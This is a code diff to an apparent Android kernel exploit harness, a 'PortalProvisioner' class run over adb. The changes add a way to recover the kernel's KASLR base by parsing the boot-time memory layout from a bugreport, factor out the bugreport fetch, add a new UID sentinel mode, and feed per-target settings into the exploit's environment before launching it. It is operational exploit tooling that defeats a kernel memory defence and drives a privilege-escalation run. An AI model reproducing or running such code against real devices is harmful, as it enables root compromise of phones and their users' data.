@@ -3153,6 +3153,17 @@ class PortalProvisioner:
     def kaslr_base(self, tag: str) -> int:
         if self.target is None:
             raise ProvisionError("target must be selected before KASLR discovery")
+        if self.target.kaslr_strategy == "bugreport":
+            # dumpstate reads the kernel log as root, so the boot-time
+            # "Virtual kernel memory layout" dump exposes this boot's .text
+            # address — the KASLR base — without simpleperf or a leak.
+            report = self.bugreport_text(tag)
+            match = re.search(r"\.text\s+: (0x[0-9a-f]+) -", report)
+            if not match:
+                raise ProvisionError(
+                    "kernel .text range is absent from bugreport"
+                )
+            return int(match.group(1), 16)
         offsets = self.target.kaslr_pc_offsets
         simpleperf = "simpleperf"
         if self.target.bundled_simpleperf:
@@ -3453,6 +3464,16 @@ class PortalProvisioner:
             raise ProvisionError(
                 "allocator diagnostic did not expose a verified memstart_addr"
             )
+        report = self.bugreport_text(tag)
+        match = re.search(r"memory\s+: (0x[0-9a-f]+) -", report)
+        if not match:
+            raise ProvisionError("kernel virtual memory range is absent from bugreport")
+        virtual_start = int(match.group(1), 16)
+        return (
+            0x80000000 - (virtual_start - 0xFFFFFFC000000000)
+        ) & 0xFFFFFFFFFFFFFFFF
+
+    def bugreport_text(self, tag: str) -> str:
         result = self.adb_run(["shell", "bugreportz", "-p"], timeout=180)
         match = re.search(r"OK:(\S+\.zip)", result.stdout)
         recovered_archive = False
@@ -3499,13 +3520,7 @@ class PortalProvisioner:
                 report = archive.read(report_name).decode(errors="replace")
         if recovered_archive:
             print("BUGREPORT_ARCHIVE_OK source=finalized-begin", flush=True)
-        match = re.search(r"memory\s+: (0x[0-9a-f]+) -", report)
-        if not match:
-            raise ProvisionError("kernel virtual memory range is absent from bugreport")
-        virtual_start = int(match.group(1), 16)
-        return (
-            0x80000000 - (virtual_start - 0xFFFFFFC000000000)
-        ) & 0xFFFFFFFFFFFFFFFF
+        return report
 
     def exploit(self, base: int, memstart: int, attempt: int) -> bool:
         if self.target is None:
@@ -3552,7 +3567,7 @@ class PortalProvisioner:
             environment["GHOSTLOCK_MM_RECYCLE_SLABS"] = str(
                 self.target.mm_recycle_slabs
             )
-        if self.target.proc_uid_sentinel in ("run_as", "app"):
+        if self.target.proc_uid_sentinel in ("run_as", "app", "user"):
             environment["GHOSTLOCK_PROC_UID_APP_SENTINEL"] = "1"
             if self.target.proc_uid_sentinel == "run_as":
                 environment.update(
@@ -3563,6 +3578,12 @@ class PortalProvisioner:
                     ),
                     }
                 )
+            elif self.target.proc_uid_sentinel == "user":
+                environment["GHOSTLOCK_PROC_UID_USER_SENTINEL"] = "1"
+                if self.target.proc_uid_user_ids:
+                    environment["GHOSTLOCK_SENTINEL_USER_IDS"] = ",".join(
+                        str(uid) for uid in self.target.proc_uid_user_ids
+                    )
             else:
                 environment["GHOSTLOCK_PROC_UID_APP_COMPONENT"] = (
                     f"{EXPLOIT_SENTINEL_PACKAGE}/.SentinelActivity"
@@ -3900,6 +3921,7 @@ class PortalProvisioner:
             timeout=10,
         )
         self.adb_run(["shell", "logcat", "-c"], timeout=5)
+        environment.update(self.target.exploit_env)
         shell = "env " + " ".join(
             f"{name}={shlex.quote(value)}" for name, value in environment.items()
         ) + " /system/bin/true"
